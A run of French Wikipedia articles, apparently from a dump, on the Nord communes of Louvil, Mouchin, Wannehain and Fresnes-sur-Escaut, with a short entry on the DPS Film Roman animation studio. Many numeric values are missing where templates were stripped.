Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Marque Deûle ». Ce document de planification concerne un territoire de de superficie, délimité par les bassins versants de la Marque et de la Deûle, formant une vaste cuvette sédimentaire de de long et de de large, où la pente est très faible. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est la Métropole européenne de Lille.
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Lesquin à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Louvil est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Cysoing, une agglomération intra-départementale regroupant cinq communes, dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Lille (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de ou plus (hors Paris).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (69,6 % en 2018), en diminution par rapport à 1990 (76,3 %). La répartition détaillée en 2018 est la suivante : 
terres arables (64,4 %), zones urbanisées (17,1 %), forêts (13,3 %), prairies (5,3 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Malgré les apparences, le nom de Louvil ne vient pas du mot "loup". Il vient du mot latin: "ovile", qui signifie bergerie. Louvil, dans les temps anciens, fut, en effet, remarquable par l'élevage des moutons et l'importance de sa bergerie.
Histoire.
Louvil, au , faisait partie du "Fisc Royal" de Cysoing, que Louis le Débonnaire donna en dot à sa fille Gisèle, lorsqu'elle épousa le Comte Evrard. Louvil n'était alors qu'une bergerie; "l'ovil", de la "Courte" de Cysoing. Les habitants, s'il en existait, devaient y être très peu nombreux.
Quand le comte Evrard et la princesse Gisèle fondèrent l'abbaye de Cysoing, la terre de Louvil fit partie des biens de la dotation du nouveau monastère. Cette fondation eut lieu vers le milieu du .
À l'époque féodale, Louvil dépendait du seigneur de Cysoing, bien que la terre de Louvil fit toujours partie du domaine de l'abbaye.
Politique et administration.
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Lille, du tribunal de grande instance de Lille, de la cour d'appel de Douai, du tribunal pour enfants de Lille, du tribunal de commerce de Tourcoing, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 33,5 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 27,3 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51 % d'hommes, largement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Lieux et monuments.
Église Saint-Martin.
L'église Saint-Martin se situe au cœur du village. Le chœur de l'église est d'un style gothique et a été construit vers 1550 par l'Abbé Mathias de Barda. La nef et le clocher ont été reconstruits entre 1692 et 1708 sur l'ordre de l'abbé de Cysoing, Antoine Vranx. L'église contient également deux chapelles latérales. La tour porte la date de 1714 et sa flèche est datée de 1717 sur la charpente. L'abside a été rénovée en 1980 avec des pierres modernes.
L'intérieur de l'église et le mobilier sont riches. Cela est dû au fait que l'église Saint-Martin de Louvil appartenait au domaine de l'abbaye de Cysoing. C'est pourquoi on y trouve une grande statue de la Vierge à l'Enfant en bois polychrome du , un Christ en croix du XVe et un bel autel avec son tabernacle et son retable du XVIIIe.
L'église appartient aujourd'hui à la paroisse de l'alliance nouvelle qui regroupe 9 clochers de la Pévèle et qui dépend du diocèse de Lille.

</doc>
<doc id="191998" url="https://fr.wikipedia.org/wiki?curid=191998" title="DPS Film Roman">
DPS Film Roman

DPS Film Roman est un studio d'animation américain situé à Los Angeles. En plus de ses propres productions, DPS Film Roman est chargé de l'animation des séries "Les Simpson" ("The Simpsons") et "Les Rois du Texas". DPS Film Roman est aussi un studio d'effets spéciaux pour le cinéma.
La société a été créée sous le nom de Film Roman en 1984 par l'animateur Phil Roman. Elle a été rebaptisée DPS Film Roman en 2004. DPS Film Roman fait partie du groupe IDT Entertainment.

</doc>
<doc id="191999" url="https://fr.wikipedia.org/wiki?curid=191999" title="Mouchin">
Mouchin

Mouchin est une commune française située dans le département du Nord en région Hauts-de-France.
Géographie.
Mouchin est située dans la Pévèle à une trentaine de kilomètres au sud-est de Lille. Elle est délimitée au nord-est par la frontière belge. Tournai est à 13 kilomètres au nord-est, Saint-Amand-les-Eaux à 14 kilomètres au sud-est et Orchies à 7 kilomètres au sud-ouest.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par l'Elnon, le ruisseau du Pont du Nid, la Bercu, la Gare, le ruisseau du Pont du nid et divers autres petits cours d'eau.
L'Elnon, d'une longueur de , prend sa source près de Rumes, en Belgique, et se jette dans le Courant de l'Hopital à Saint-Amand-les-Eaux, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Scarpe aval ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de la Scarpe aval, comprenant la Pévèle, la plaine de la Scarpe et le bassin minier avec l'Ostrevent. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le , puis révisé le . La structure porteuse de l'élaboration et de la mise en œuvre est le parc naturel régional Scarpe-Escaut.
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Lesquin à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Mouchin est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Bachy, une agglomération intra-départementale regroupant trois communes, dont elle est ville-centre. Par ailleurs la commune fait partie de l'aire d'attraction de Lille (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de ou plus (hors Paris).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (87,3 % en 2018), en diminution par rapport à 1990 (90,1 %). La répartition détaillée en 2018 est la suivante : 
terres arables (75,1 %), zones urbanisées (9,8 %), prairies (6,1 %), zones agricoles hétérogènes (6,1 %), forêts (3 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Histoire.
Mouchin est situé à de la voie romaine qui reliait Arras à Tournai. L'existence de Mouchin est attestée au , sous le nom de Moucinium dans un décret de Charles le Chauve vers 847 en vertu duquel la commune est redevable du de ses ressources aux religieux de l'Abbaye de St-Amand. . Mouchin change souvent de seigneurie et d'évêché, Saint-Amand, Tournai, Marchiennes, tout en restant rattaché à Lille.
Avant la Révolution française, Mouchin est le siège d'une seigneurie. En 1355, Jean Clenquet en est le détenteur. Un autre Jean Clenquet et sa femme Marie Gommer vendent le la seigneurie de Mouchin à Hugues de Quartes, conseiller du roi de France.
Bercu ou Bercus, sur Mouchin, était également le siège d'une seigneurie, connue dès 1176, où un Wattier ou Gauthier la détient. Il épouse Antoinette d'Hierin, fille d'Anseau ou Anselme, chevalier, sire de Hiérin. Leur fils Gauthier II la possède ensuite. Il épouse Clémence de Bondues. En 1373, Baude ou Baudouin de Bercus est seigneur du lieu. La seigneurie passe plus tard à Jean, sire de Bercus, père de Marie, dame de Bercus, morte après 1355, mariée avant 1339 à Jean de Croix, écuyer, seigneur de Drumez, fils d'Olivier, seigneur de Croix. Leur fils Gilbert de Croix, dit "de Drumez", écuyer, est condamné le à payer une amende à l'abbaye de Flines pour avoir injurié et blessé les représentants du monastère. L'amende n'ayant pas été acquittée, la seigneurie est vendue par le sergent du roi aux enchères publiques, après annonces faites en l'église de Mouchin , et à Orchies et Lille. Elle est vendue au plus offrant à Messire Simon de Lallaing (Maison de Lalaing), chevalier, pour 474 écus d'or. Bernard de Croix, frère cadet de Gilbert, récupère toutefois la terre (retrait lignager probable), qui passe à son neveu et héritier Othon de Croix. Othon vend la seigneurie à Gilles Hanette, seigneur de Bercus en 1417 et 1426, marié à Catherine d'Auberchicourt, fille de Jean, chevalier (Famille d'Auberchicourt). Bercus passe à leur fils Jean, seigneur de Bercus en 1430, qui en sert le dénombrement en 1411 et 1456. Il épouse Jeanne du Chastel de la Hovarderie (Famille du Chastel de la Hovarderie). Leur fils est Messire Quentin Hanette, chevalier, seigneur de Bercus en 1426 et 1487, mort avant 1493, époux d'Anastasie de Landas, morte avant 1503. Leur fils Arnould d'Hanette, chevalier, seigneur de Bercus en 1493, épouse Catherine de la Vacquerie, fille de Jean de la Vacquerie, Premier président du Parlement de Paris. Bercus passe à leur fils François Hanette qui la relève en août 1526. François, mari de Jeanne le Preudhomme d'Hailly, est inhumé dans la chapelle Notre-Dame de l'église de Mouchin avec son épouse. Leur fille Catherine se marie avec Philippe de Tenremonde (Famille de Tenremonde), chevalier, seigneur de Bachy et de Mérignies. La seigneurie de Bercus reste alors dans la famille de Tenremonde pendant environ deux siècles.
Au , la ferme-château, du hameau de Bercu, fut une brasserie de bière puis une fromagerie avec un fromage nommé la « Mouchinette » très apprécié dans toute la région.
Entre 1896 et 1932, la ligne de chemin de fer de Saint-Amand à Hellemmes de dessert la commune.
Le , le d'infanterie territoriale français après de violents combats sur Rumes, voit son s'installer au château de Mouchin alors que son passe au village et se dirige sur Genech. Mais les Allemands envoient une pluie d'obus sur le régiment qui doit se replier sur Nomain puis Orchies.
Politique et administration.
Tendances politiques et résultats.
Lors du premier tour des élections municipales le , quinze sièges sont à pourvoir ; on dénombre , dont (56,19 %), (1,40 %) et (96,50 %). La liste "Défense des intérêts communaux" menée par le maire sortant Christian Devaux recueille (58,51 %) et remporte ainsi douze sièges au conseil municipal contre trois pour la liste "Mouchin demain" menée par Quentin Morgan avec (41,49 %).
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Lille, du tribunal de grande instance de Lille, de la cour d'appel de Douai, du tribunal pour enfants de Lille, du tribunal de commerce de Tourcoing, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 34,0 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 26,4 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,57 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Culture locale et patrimoine.
Folklore.
Mouchin a pour géant Hippolyte-Hyacinthe, représentant à la fois le dernier seigneur et la période d'évolution et d'industrialisation de la commune.
Héraldique.
"De gueules à la croix ancrée et alaisée d'or, cantonnée de quatre couronnes de laurier du même."
"De gueules, à la croix ancrée d'or, cantonnée de quatre annelets d'or fleurdelysés."
Retrouvées sur certains corbeaux de poutres, bâtiments, ainsi que sur le "tableau de famille" des Tenremonde,dans la chapelle funéraire se trouvant dans l'église Saint-Éloi de Bachy
"D'or à trois trèfles de sable."

</doc>
<doc id="192000" url="https://fr.wikipedia.org/wiki?curid=192000" title="Film Roman">
Film Roman



</doc>
<doc id="192001" url="https://fr.wikipedia.org/wiki?curid=192001" title="Wannehain">
Wannehain

Wannehain est une commune française, située dans le département du Nord en région Hauts-de-France.
Géographie.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le ruisseau de Cysoing et un autre petit cours d'eau.
Un plan d'eau complète le réseau hydrographique : l'étang la Fontaine, d'une superficie totale de ( sur la commune).
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Marque Deûle ». Ce document de planification concerne un territoire de de superficie, délimité par les bassins versants de la Marque et de la Deûle, formant une vaste cuvette sédimentaire de de long et de de large, où la pente est très faible. Le périmètre est arrêté le et le SAGE proprement dit est approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est la Métropole européenne de Lille. 
La qualité des cours d'eau peut être consultée sur un site spécial géré par les agences de l'eau et l'Agence française pour la biodiversité. 
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Lesquin à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Wannehain est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Lille (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de ou plus (hors Paris).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (66,9 % en 2018), en diminution par rapport à 1990 (72 %). La répartition détaillée en 2018 est la suivante : 
terres arables (57,7 %), zones urbanisées (16,6 %), forêts (10,1 %), prairies (9,2 %), milieux à végétation arbustive et/ou herbacée (6,4 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
D'un nom de personne germanique "Wano" + "heim" francisé en "hain Guenehen" (1108), "Wenehen" (vers 1175), "Wenehem" (1179), Wannehain (1248). 
"Wanhem" en flamand.
Histoire.
C'est au que Wannehain est mentionné pour la première fois. Le , le pape Clément III confirme, dans une bulle adressée au doyen Arnulphe, la possession des terres et des bois de Wannehain (Wennehem) dans la liste des biens et des propriétés du chapitre de Tournai. La seigneurie de Wannehain relève bien du trésorier du chapitre de la cathédrale de Tournai, comme il est écrit dans un document signé à Bruxelles le , dans les Archives du marquisat de Roubaix :
Le comte Maximilien Charles Joseph de Lalaing donne procuration à Bernard Serrurier, greffier et receveur de Wannehain pour… « aller relever et droiturier pardevant la cour féodale de la Trésorerie de la Cathédrale de Tournay les fiefs et seigneurie dudit Wannehain avec ses appendances et dépendances... » et l'autorise à « faire en notre nom les serments requis et généralement toutes autres œuvres de loy… ».
En 1613, la seigneurie de Wannehain (orthographiée Wannechain) est aux mains de Louis de Landas, écuyer, seigneur de Landas, appartenant à la maison noble de Landas. Louis de Landas bénéficie le de lettres données à Bruxelles l'élevant chevalier. Il prend pour épouse Jeanne de Cambry.
Politique et administration.
Maire de 1802 à 1807 : J. Dorchies.
Maire en 1881 : Heddebault.
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Lille, du tribunal de grande instance de Lille, de la cour d'appel de Douai, du tribunal pour enfants de Lille, du tribunal de commerce de Tourcoing, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 40,3 %, soit au-dessus de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 16,8 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51,07 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="192003" url="https://fr.wikipedia.org/wiki?curid=192003" title="Fresnes-sur-Escaut">
Fresnes-sur-Escaut

Fresnes-sur-Escaut est une commune française située dans le département du Nord (59), en région Hauts-de-France.
Géographie.
Environnement.
La richesse environnementale de la commune est notamment liée à sa situation en vallée de l'Escaut, élément important du corridor biologique d'importance paneuropéenne et de la trame bleue régionale et nationale à la suite du Grenelle de l'environnement.
La commune a mis en place une démarche de gestion différentiée.
Toponymie.
"Frasnia", cartulaire de Notre-Dame de Condé; 1141. "Frania",Op.dipl.1. 715. "Frasna", cartulaire de Saint-Amand; 1180. "Frasne", cartulaire de Notre-Dame de Condé; 1276. "Fraxinum",cartulaire de Saint-Amand;1175.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par l'Escaut canalisée, la Vieil-Escaut, le canal de Saint-Saulve, le Malanoye, le Malolin, le Pas de l'Ayau, le Sarteau et divers autres petits cours d'eau.
L'Escaut est un fleuve européen de de long, qui traverse trois pays (France, Belgique et Pays-Bas), avant de se jeter en mer du Nord. La partie canalisée en France relie Cambrai à , après avoir traversé .
Le canal Mons-Condé a été construit à partir de 1807 et mis en service en 1818, pour faciliter le transport du « charbon de terre » par l'Escaut, des mines du Borinage vers la France (le territoire belge faisait partie de l'Empire à l'époque napoléonienne). Il a été comblé au profit du Canal Nimy-Blaton-Péronnes.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Valenciennes à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Fresnes-sur-Escaut est catégorisée centre urbain intermédiaire, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Valenciennes (partie française), une agglomération internationale regroupant , dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Valenciennes (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (42,1 % en 2018), une proportion sensiblement équivalente à celle de 1990 (41,9 %). La répartition détaillée en 2018 est la suivante : 
zones urbanisées (30,2 %), zones agricoles hétérogènes (24,3 %), milieux à végétation arbustive et/ou herbacée (13,9 %), forêts (11,3 %), prairies (7,5 %), terres arables (6,5 %), cultures permanentes (3,9 %), zones humides intérieures (2,2 %), zones industrielles ou commerciales et réseaux de communication (0,2 %).
Le quartier du centre fait partie du programme national de revitalisation des quartiers anciens dégradés (PNRQAD). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Voies de communications et transports.
La commune est desservie par la ligne T2 du tramway de Valenciennes par le biais des stations "Fresnes – Mairie" et "Carnot". Cette ligne y emprunte le pont du Moulin pour franchir le canal de l'Escaut.
La commune est également desservie par la ligne 6 du réseau de bus Transvilles.
Étymologie.
Vraisemblablement, Fresnes est issue du mot "frêne", arbre désigné en Picard sous le nom "frane".
Histoire.
Thomas de Fresnes a combattu et trouvé la mort à la bataille d'Azincourt en 1415.
Le , le vicomte Jacques Désandrouin obtient la permission du roi pour mettre en œuvre des recherches de houille à Fresnes.
Le Jacques Mathieu et son équipe de mineurs venus de Charleroi découvrent une veine de charbon maigre de quatre pieds d'épaisseur (1,20 m) à 35 toises de profondeur (). En une journée on remonte deux charrettes pleines. L'évènement fit accourir la foule de partout, certains emportent chez eux quelques précieuses gaillettes.
Le les deux fosses de Fresnes s'éboulent sous l'invasion des eaux.
Le 27 novembre 1788, sont érigées en duché les terres de Condé, Fresnes, Vieux-Condé, Hargnies, situées en Hainaut, sous la dénomination de duché de Croÿ en faveur d'Emmanuel Ferdinand François duc de Croÿ (maison de Croÿ).
En mars 1789, Jean-Léonard-Joseph Mathieu, petit-fils de Jacques Mathieu, fils de Pierre Mathieu et d'Anne Jacqueline Briffault, famille disposant déjà d'armes (héraldique), est anobli par le roi Louis XVI pour la découverte et l'exploitation des mines de charbon d'Anzin.
Auguste Joseph Droulers, originaire de Roubaix, acheta une fabrique de chicorée à Fresnes-sur-Escaut à Émile Courtin vers 1880 qu'il transforma en chocolaterie en 1890 pour commercialiser le chocolat Droulers.
C'est aussi une cité où un grand carnaval est organisé le 15 août de chaque année.
Politique et administration.
Rattachements administratifs et électoraux.
La commune se trouve depuis 1824 dans l'arrondissement de Valenciennes du département du Nord. Pour l'élection des députés, elle fait partie depuis 1988 de la vingtième circonscription du Nord.
Elle faisait partie depuis 1793 du canton de Condé-sur-l'Escaut. Dans le cadre du redécoupage cantonal de 2014 en France, la commune est désormais rattachée au canton d'Anzin
La commune relève, dans l'ordre judiciaire, du tribunal judiciaire de Valenciennes, de la cour d'appel de Douai, du tribunal pour enfants de Valenciennes, du conseil de prud'hommes de Valenciennes, du tribunal de commerce de Valenciennes, et, dans l'ordre administratif, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Intercommunalité.
La ville fait partie de la communauté d'agglomération Valenciennes Métropole, créée en 2000 par la fusion de la "communauté de communes de la vallée de l'Escaut", de la "communauté de communes du Pays de Condé" et du "syndicat intercommunal à vocation multiple (SIVOM) de Trith-Saint-Léger et environs".
Tendances politiques et résultats.
Lors du second tour des élections municipales de 2020 dans le Nord, la liste DVG menée par la maire sortante Valérie Fornies a obtenu la majorité des suffrages exprimés, avec 950 voix (49,89 %, 22 conseillers municipaux élus dont 2 communautaires), devançant largement les listes menées respectivement par : 
- Fabrice Zaremba (DVD, 691 voix, 36,29 %, 5 conseillers municipaux élus dont 1 communautaire) ;
- Maxime Potelle (RN, 263 voix, 13,81 %, 2 conseillers municipaux) ;
L'abstention s'est élevée à 60,77 % lors d'un scrutin marqué par la pandémie de Covid-19 en France.
Distinctions et labels.
En 2010, la commune de Fresnes-sur-Escaut a été récompensée par le label « Ville Internet @@ ».
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 38,8 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 23,2 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,89 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Culture locale et patrimoine.
La fosse du Sarteau.
La fosse du Sarteau de la Compagnie des mines d'Anzin est un ancien charbonnage du bassin minier du Nord-Pas-de-Calais, situé à Fresnes-sur-Escaut. Le puits d'extraction est commencé le 4 juin 1822 et extrait l'année suivante après sept mois de travaux. Le 8 août 1823 un puits d'épuisement est commencé, quatre jours plus tard, le puits d'extraction est noyé par une venue d'eau brutale. La fosse aura tout au long de sa carrière à subir les venues d'eau causées par la proximité de l'Escaut. La fosse est arrêtée en 1860. Le puits d'épuisement est abandonné, mais le puits d'extraction est conservé pour l'aérage des travaux de la fosse d'Outre Wez jusqu'en 1867. Le puits d'épuisement est comblé en 1883, mais sa tour en briques n'a jamais été détruite.
Au début du , Charbonnages de France matérialise les têtes des puits du Sarteau. Le chevalement et ses installations militaires sont classés aux monuments historiques le 9 mars 1999, ce décret annule le précédent du 8 octobre 1984 qui inscrivait ces mêmes installations. La fosse du Sarteau a été inscrite le 30 juin 2012 sur la liste du patrimoine mondial de l'Unesco.
Le temple de l'amour.
Le temple de l'amour, situé dans le parc Joliot-Curie. Il est dû à l'architecte Jean Chalgrin et date du . Il existe trois bâtiments de ce type en France, les deux autres étant situés dans le parc des Buttes-Chaumont à Paris et au Petit Trianon à Versailles.
L'hôtel de ville.
Cet édifice dont la première pierre a été posée par monsieur Léon Renard, maire, fut inauguré le . Il nous rappelle l’importance et la richesse de Fresnes-sur-Escaut à la fin du . Le dynamitage du clocheton en 1918 avait entraîné la destruction de la toiture et d'une grande partie du bâtiment qui fut reconstruit en 1923. La façade a été restaurée en 2001 mais a très peu changé depuis sa première construction. Le nouveau carillon comportant seize cloches, installé par la société Lepers et Frères a été inauguré en . L’intérieur de la mairie a été maintes fois modifié pour s’adapter à l’évolution des besoins. La dernière transformation, après l’installation de l’ascenseur et la restauration de la salle d’honneur en 2011, fut le réaménagement des bureaux d’accueil du public.
La gare de Fresnes sur Escaut.
